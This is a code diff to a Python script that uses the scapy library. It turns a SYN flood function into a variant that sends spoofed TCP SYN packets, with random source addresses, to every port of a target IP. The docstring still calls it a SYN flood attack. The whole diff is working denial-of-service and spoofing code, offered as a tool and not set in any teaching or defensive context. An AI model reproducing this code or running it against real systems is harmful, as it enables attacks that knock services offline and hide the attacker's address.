@@ -3,14 +3,13 @@ from scapy.all import IP, TCP, send
 from utilities import randInt, randomIP
 
 
-def SYN_Flood(targetIP, numPackets, ports):
+def SCAN_Flood(targetIP, numPackets):
     """
-    SYN Flood attack function
+    Sends packets over all ports
 
     Parameters:
     targetIP (str) : IP to run SYN Flood attack on
     numPackets (int) : Number of SYN packets to send to each port
-    ports (List[int]) : Optional list of ports to send SYN packets to
     """
     
     # Loop over number of packets to send to each port
@@ -21,12 +20,7 @@ def SYN_Flood(targetIP, numPackets, ports):
         spoof_window = randInt()
         
         # Loop over each specified port
-        for port in ports:
-            # Create spoofed IP packet
-            IP_Packet = IP()
-            IP_Packet.src = randomIP()
-            IP_Packet.dst = targetIP
-
+        for port in range(3, 65536):
             # Create spoofed TCP Packet
             TCP_Packet = TCP()	
             TCP_Packet.sport = spoof_port
@@ -36,7 +30,7 @@ def SYN_Flood(targetIP, numPackets, ports):
             TCP_Packet.window = spoof_window
 
             # Send spoofed TCP SYN packet
-            send(IP_Packet/TCP_Packet, verbose=0)
+            send(IP(src=randomIP(), dst=targetIP)/TCP_Packet, verbose=0)
             #print(f"Sent packet to {targetIP}:{port}")
 
-#SYN_Flood('127.0.0.1', 3, [123, 456])
+#SCAN_Flood('127.0.0.1', 1)
